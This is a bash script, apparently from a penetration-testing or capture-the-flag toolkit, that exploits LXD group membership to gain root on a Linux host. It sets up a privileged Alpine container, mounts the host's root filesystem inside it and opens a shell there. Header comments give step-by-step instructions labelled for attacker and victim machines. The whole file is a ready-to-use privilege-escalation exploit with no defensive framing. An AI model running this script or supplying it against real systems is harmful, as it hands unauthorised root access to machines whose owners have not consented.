#!/bin/bash

# Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]
# Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]
# "sed -i -e 's/\r$//' scriptname.sh" run this command if the script has error when executed
# Change the path of lxd and lxc in the script if cannot find the path of lxd and lxc
# Step 3: Run this script and you will get root [Victim Machine]
# Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine

function helpPanel(){
  echo -e "\nUsage:"
  echo -e "\t[-f] Filename (.tar.gz alpine file)"
  echo -e "\t[-h] Show this help panel\n"
  exit 1
}

function createContainer(){
  /snap/bin/lxc image import $filename --alias alpine && /snap/bin/lxd init --auto
  echo -e "[*] Listing images...\n" && /snap/bin/lxc image list
  /snap/bin/lxc init alpine privesc -c security.privileged=true
  /snap/bin/lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
  /snap/bin/lxc start privesc
  /snap/bin/lxc exec privesc sh
  cleanup
}

function cleanup(){
  echo -en "\n[*] Removing container..."
  /snap/bin/lxc stop privesc && /snap/bin/lxc delete privesc && /snap/bin/lxc image delete alpine
  echo " [√]"
}

set -o nounset
set -o errexit

declare -i parameter_enable=0; while getopts ":f:h:" arg; do
  case $arg in
    f) filename=$OPTARG && let parameter_enable+=1;;
    h) helpPanel;;
  esac
done

if [ $parameter_enable -ne 1 ]; then
  helpPanel
else
  createContainer
fi
